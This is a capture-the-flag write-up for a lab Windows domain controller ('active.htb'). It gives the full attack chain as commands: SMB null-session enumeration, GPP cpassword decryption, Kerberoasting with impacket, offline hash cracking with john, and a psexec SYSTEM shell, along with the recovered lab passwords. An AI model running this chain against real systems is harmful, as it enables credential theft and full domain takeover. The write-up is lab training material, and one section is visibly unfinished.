
**IP Address:** `10.10.10.100`  
**OS:** Windows  
**Difficulty:** Medium  
**Tags:** SMB, GPP, SYSVOL, Kerberos, User SPNs, Password Cracking

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

```bash
# Command
> ping -c 1 10.10.10.100
```

**Result:** Host is alive. Let's begin the enumeration.

``` bash
# Output
PING 10.10.10.100 (10.10.10.100) 56(84) bytes of data.
64 bytes from 10.10.10.100: icmp_seq=1 ttl=127 time=34.8 ms

--- 10.10.10.100 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 34.753/34.753/34.753/0.000 ms
```
### 1.2 Port Scanning

```bash
# Command
> nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.100 -oG allPorts
```

``` bash
# Output
PORT      STATE SERVICE            REASON
53/tcp    open  domain             syn-ack ttl 127
88/tcp    open  kerberos-sec       syn-ack ttl 127
135/tcp   open  msrpc              syn-ack ttl 127
139/tcp   open  netbios-ssn        syn-ack ttl 127
389/tcp   open  ldap               syn-ack ttl 127
445/tcp   open  microsoft-ds       syn-ack ttl 127
464/tcp   open  kpasswd5           syn-ack ttl 127
593/tcp   open  http-rpc-epmap     syn-ack ttl 127
636/tcp   open  ldapssl            syn-ack ttl 127
3268/tcp  open  globalcatLDAP      syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl   syn-ack ttl 127
5722/tcp  open  msdfsr             syn-ack ttl 127
9389/tcp  open  adws               syn-ack ttl 127
47001/tcp open  winrm              syn-ack ttl 127
49152/tcp open  unknown            syn-ack ttl 127
49153/tcp open  unknown            syn-ack ttl 127
49154/tcp open  unknown            syn-ack ttl 127
49155/tcp open  unknown            syn-ack ttl 127
49157/tcp open  unknown            syn-ack ttl 127
49158/tcp open  unknown            syn-ack ttl 127
49163/tcp open  unknown            syn-ack ttl 127
49164/tcp open  unknown            syn-ack ttl 127
49165/tcp open  unknown            syn-ack ttl 127
49166/tcp open  unknown            syn-ack ttl 127
49167/tcp open  unknown            syn-ack ttl 127
```

Extract discovered ports with:

```bash
# Command
> extractPorts allPorts
```

``` bash
# Output
[+] Extracting information...
[*] IP Address: 10.10.10.100
[*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49173

[+] Ports copied to clipboard
```

### 1.3 Deep Scan

```bash
# Command
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49173 10.10.10.100 -oN targeted
```

``` bash
# Output
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec Microsoft Windows RPC
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
464/tcp   open  kpasswd5     Microsoft Windows RPC
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl      Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3268/tcp  open  globalcatLDAP Microsoft Windows RPC
3269/tcp  open  globalcatLDAPssl Microsoft Windows RPC
5722/tcp  open  msdfsr       Microsoft Windows RPC
9389/tcp  open  adws         Microsoft Windows RPC
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49166/tcp open  msrpc_http   Microsoft Windows RPC over HTTP 1.0
49173/tcp open  msrpc        Microsoft Windows RPC

Host script results:
| smb2-security-mode: 
|   2.02:
|     Message signing enabled and required
|_  smb2-time: 
   date: 2025-07-04T19:29:15
   start_date: 2025-04-17T19:12:14
```

Key services from the Active Directory ecosystem are identified, such as Kerberos (88), LDAP (389), SMB (445), among others.

---

## 2. SMB Enumeration & SYSVOL Access

### 2.1 Machine Type Detection

```bash
# Command
crackmapexec smb 10.10.10.100
```

``` bash
# Output
SMB         10.10.10.100    445    DC      [+] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
```

**Result:** The machine is a **Domain Controller**.

Add the domain to `/etc/hosts`:

```
10.10.10.100    active.htb
```

### 2.2 Detailed Scan Review

```bash
# Command
cat targeted -l java
```

(Same information as in point 1.3, however, the extension “-l java” allows you to view it in color and therefore filter it better. It is more convenient for the user.)

### 2.3 Enumerate Shares with smbclient

```bash
# Command
smbclient -L 10.10.10.100 -N
```

``` bash
# Output
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk      
        SYSVOL          Disk      Logon server share
        Users           Disk      

Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Several public shares are listed using a null session (no authentication).

### 2.4 Enumeration with smbmap

```bash
# Command
smbmap -H 10.10.10.100
```

``` bash
# Output
[+] IP: 10.10.10.100:445    Name: active.htb
        ADMIN$       NO ACCESS     Remote Admin
        C$           NO ACCESS     Default share
        IPC$         NO ACCESS     Remote IPC
        NETLOGON     NO ACCESS     Logon server share
        Replication  READ ONLY
        SYSVOL       NO ACCESS     Logon server share
        Users        NO ACCESS
```

Access is granted only to the `Replication` share.

```bash
# Command
smbmap -H 10.10.10.100 -r Replication
```

``` Bash
# Output
/Replication
  .                                   DR        0 Sat Jul 21 06:37:44 2018
  active.htb                          DR        0 Sat Jul 21 06:37:44 2018
```

Inside `Replication/active.htb/`:
```bash
# Command
smbmap -H 10.10.10.100 -r Replication/active.htb
```

``` bash
# Output
/Replication/active.htb
  .                                   DR        0 Sat Jul 21 06:37:44 2018
  DfsrPrivate                         DR        0 Sat Jul 21 06:37:44 2018
  Policies                            DR        0 Sat Jul 21 06:37:44 2018
  scripts                             DR        0 Sat Jul 21 06:37:44 2018
```

This structure resembles the `SYSVOL` directory, which may contain Group Policy Objects and potentially credentials.

```bash
# Command
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies
```

``` bash
# Output
/Replication/active.htb
  .                                   DR        0 Sat Jul 21 06:37:44 2018
  DfsrPrivate                         DR        0 Sat Jul 21 06:37:44 2018
  Policies                            DR        0 Sat Jul 21 06:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9} DR        0 Sat Jul 21 06:37:44 2018
```

# ACABAR DE DOCUMENTAR BIEN. REHACER LA MAQUINA
### 2.5 Sensitive File Analysis

Navigate to:

`Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/`

The file `Groups.xml` is found, which may store credentials.

Download it with:

```bash
smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

Extract the `<cpassword>` value and decrypt it:

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

**Credentials retrieved:**  
Username: `SVC_TGS`  
Password: `GPPstillStandingStrong2k18`

### 2.6 Credential Validation

```bash
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

**Result:** Valid user

### 2.7 Explore Shares with Credentials

```bash
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

Access to the `Users` share is confirmed:

```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS/Desktop/
```

The file `user.txt` is found and downloaded:

```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt
```

✅ **User flag obtained**

---

## 3. Domain Enumeration

### 3.1 Enumerate Users

```bash
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'enumdomusers'
```

### 3.2 Enumerate Groups

```bash
rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'enumdomgroups'
```

---

## 4. Kerberos SPN Attack

### 4.1 Enumerate SPNs

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

A TGS is retrieved with the hash of the `Administrator` user.

### 4.2 Crack the Hash

Save the hash in a file named `hash` and run:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hash
```

**Password found:** `Ticketmaster1968`

### 4.3 Validate Administrator Access

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
```

**Result:** The `Administrator` account is valid and fully compromised (Pwn3d).

### 4.4 Remote Access via psexec

Since WinRM is closed, `psexec` is used:

```bash
psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
```

A remote shell is obtained as `NT AUTHORITY\SYSTEM`.

✅ **Root flag obtained**

---

# ✅ MACHINE COMPLETE